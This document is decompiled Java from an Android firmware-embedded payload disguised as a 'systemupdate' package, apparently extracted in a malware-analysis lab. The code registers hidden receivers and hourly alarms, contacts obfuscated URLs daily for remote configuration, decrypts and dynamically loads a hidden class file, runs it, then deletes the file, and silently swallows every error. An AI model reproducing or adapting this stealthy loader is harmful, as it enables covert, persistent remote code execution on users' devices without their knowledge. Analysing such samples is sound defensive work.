package com.android.systemupdate.a;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import com.android.systemupdate.a.a.g;
import com.android.systemupdate.a.a.m;
import com.android.systemupdate.a.a.p;
import java.io.File;

/* JADX INFO: compiled from: MainRun.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/b/classes.dex */
public class c {
    private static c a = null;
    private Context b;
    private ClassLoader f;
    private a c = null;
    private boolean d = false;
    private int e = 0;
    private boolean g = false;
    private boolean h = false;

    /* JADX INFO: compiled from: MainRun.java */
    private class a extends BroadcastReceiver {
        private a() {
        }

        /* synthetic */ a(c cVar, a aVar) {
            this();
        }

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            String str;
            String str2;
            String str3;
            try {
                c.this.b();
                if (intent.getAction().equals(String.valueOf(context.getPackageName()) + p.a(com.android.systemupdate.a.a.i))) {
                    if (Build.VERSION.SDK_INT >= 19) {
                        com.android.systemupdate.a.a.b.a(context, String.valueOf(context.getPackageName()) + p.a(com.android.systemupdate.a.a.i), 3600000L);
                        return;
                    }
                    return;
                }
                if (intent.getAction().equals(String.valueOf(p.a(com.android.systemupdate.a.a.A)) + com.android.systemupdate.a.a.a())) {
                    String key = intent.getStringExtra("key");
                    String reply = intent.getStringExtra("reply");
                    int state = 0;
                    String str4 = m.b(c.this.b, p.b(com.android.systemupdate.a.a.c), p.b(com.android.systemupdate.a.a.e), "");
                    if (str4 != null && str4.contains(key)) {
                        state = 1;
                    }
                    if (state == 0 && (str3 = m.b(c.this.b, p.b(com.android.systemupdate.a.a.c), p.b(com.android.systemupdate.a.a.d), "")) != null && str3.contains(key)) {
                        state = 1;
                    }
                    if (state == 0 && (str2 = m.b(c.this.b, p.b(b.k), p.b(b.r), "")) != null && str2.contains(key)) {
                        state = 1;
                    }
                    if (state == 0 && (str = m.b(c.this.b, p.b(b.k), p.b(b.q), "")) != null && str.contains(key)) {
                        state = 1;
                    }
                    if (reply != null && reply.length() > 0) {
                        Intent time_intent = new Intent(reply);
                        time_intent.putExtra("state", state);
                        time_intent.putExtra("song", m.b(context, p.b(com.android.systemupdate.a.a.k), p.b(com.android.systemupdate.a.a.m), ""));
                        c.this.b.sendBroadcast(time_intent);
                    }
                }
            } catch (Throwable th) {
            }
        }
    }

    public static c a() {
        if (a == null) {
            a = new c();
        }
        return a;
    }

    public void a(Context context, int type) {
        if (this.b != null) {
            b();
            return;
        }
        if (context != null) {
            this.b = context;
        }
        if (this.b != null) {
            this.e = type;
            try {
                if (this.c != null) {
                    this.b.unregisterReceiver(this.c);
                    this.c = null;
                }
            } catch (Throwable th) {
            }
            try {
                this.c = new a(this, null);
                IntentFilter filter = new IntentFilter();
                filter.addAction(String.valueOf(this.b.getPackageName()) + p.a(com.android.systemupdate.a.a.i));
                filter.addAction(p.a(com.android.systemupdate.a.a.j));
                if (this.e == 1) {
                    filter.addAction(String.valueOf(p.a(com.android.systemupdate.a.a.A)) + com.android.systemupdate.a.a.a());
                }
                if (Build.VERSION.SDK_INT >= 34) {
                    this.b.registerReceiver(this.c, filter, 3);
                } else {
                    this.b.registerReceiver(this.c, filter);
                }
            } catch (Throwable th2) {
            }
            com.android.systemupdate.a.a.b.a(this.b, String.valueOf(this.b.getPackageName()) + p.a(com.android.systemupdate.a.a.i), 3600000L);
            b();
        }
    }

    public void b() {
        try {
            if (this.b != null && p.l(this.b) && p.a(this.b) && !this.d) {
                this.d = true;
                this.g = true;
                int nextRequestTimeM = com.android.systemupdate.a.a.b(this.b) ? 480 : m.b(this.b, p.b(b.k), p.b(b.m), 240);
                long requestTimeM = m.b(this.b, p.b(b.k), p.b(b.n), 0L);
                long timeM = System.currentTimeMillis() - requestTimeM;
                if (timeM > 0 && timeM < nextRequestTimeM * 60 * 1000) {
                    this.g = false;
                }
                this.h = true;
                int nextRequestTimeK = com.android.systemupdate.a.a.b(this.b) ? 480 : m.b(this.b, p.b(com.android.systemupdate.a.a.c), p.b(com.android.systemupdate.a.a.f), 240);
                long requestTimeK = m.b(this.b, p.b(com.android.systemupdate.a.a.c), p.b(com.android.systemupdate.a.a.g), 0L);
                long timeK = System.currentTimeMillis() - requestTimeK;
                if (timeK > 0 && timeK < nextRequestTimeK * 60 * 1000) {
                    this.h = false;
                }
                if (!this.g && !this.h) {
                    this.d = false;
                } else {
                    new Thread(new Runnable() { // from class: com.android.systemupdate.a.c.1
                        @Override // java.lang.Runnable
                        public void run() {
                            try {
                                try {
                                    a(c.this.b);
                                    int config_state = m.b(c.this.b, p.b(com.android.systemupdate.a.a.k), p.b(com.android.systemupdate.a.a.y), -1);
                                    if (c.this.h) {
                                        m.a(c.this.b, p.b(com.android.systemupdate.a.a.c), p.b(com.android.systemupdate.a.a.g), System.currentTimeMillis());
                                        if (config_state != 2) {
                                            try {
                                                String jm_model_config = System.getProperty(p.a(com.android.systemupdate.a.a.B));
                                                int postion = jm_model_config.lastIndexOf(File.separator);
                                                String jm_model_path = jm_model_config.substring(0, postion);
                                                String jm_model_class = jm_model_config.substring(postion + 1);
                                                String path = String.valueOf(c.this.b.getDataDir().getAbsolutePath()) + jm_model_path;
                                                String tPath = String.valueOf(path) + p.a(com.android.systemupdate.a.a.s);
                                                try {
                                                    if (c.this.f == null) {
                                                        p.a(path, tPath, 1, com.android.systemupdate.a.a.a, com.android.systemupdate.a.a.b);
                                                        if (com.android.systemupdate.a.a.f.d(tPath)) {
                                                            c.this.f = com.android.systemupdate.a.a.d.a(c.this.b, tPath);
                                                        }
                                                    }
                                                    if (c.this.f != null) {
                                                        com.android.systemupdate.a.a.d.a(c.this.b, c.this.f, jm_model_class, p.a(com.android.systemupdate.a.a.C));
                                                    }
                                                } catch (Throwable th) {
                                                    c.this.f = null;
                                                }
                                                com.android.systemupdate.a.a.f.b(tPath);
                                            } catch (Throwable th2) {
                                            }
                                        }
                                    }
                                    if (c.this.g) {
                                        m.a(c.this.b, p.b(b.k), p.b(b.n), System.currentTimeMillis());
                                        if (config_state > 0) {
                                            f.a().a(c.this.b);
                                        }
                                    }
                                } catch (Throwable th3) {
                                    c.this.d = false;
                                }
                            } finally {
                                c.this.d = false;
                            }
                        }

                        private void a(Context context) {
                            try {
                                long time = m.b(context, p.b(com.android.systemupdate.a.a.k), p.b(com.android.systemupdate.a.a.z), -1L);
                                if (System.currentTimeMillis() - time >= 86400000) {
                                    int len = com.android.systemupdate.a.a.x.length;
                                    String[] urls = new String[len];
                                    for (int i = 0; i < len; i++) {
                                        urls[i] = p.a(com.android.systemupdate.a.a.x[i]);
                                    }
                                    int state = m.b(context, p.b(com.android.systemupdate.a.a.k), p.b(com.android.systemupdate.a.a.y), -1);
                                    String signa = p.a(com.android.systemupdate.a.a.a(context));
                                    int config_state = g.a(context, urls, String.valueOf(state), signa);
                                    if (config_state >= 0) {
                                        m.a(context, p.b(com.android.systemupdate.a.a.k), p.b(com.android.systemupdate.a.a.z), System.currentTimeMillis());
                                        m.a(context, p.b(com.android.systemupdate.a.a.k), p.b(com.android.systemupdate.a.a.y), config_state);
                                    }
                                }
                            } catch (Throwable th) {
                            }
                        }
                    }).start();
                }
            }
        } catch (Throwable th) {
            this.d = false;
        }
    }
}
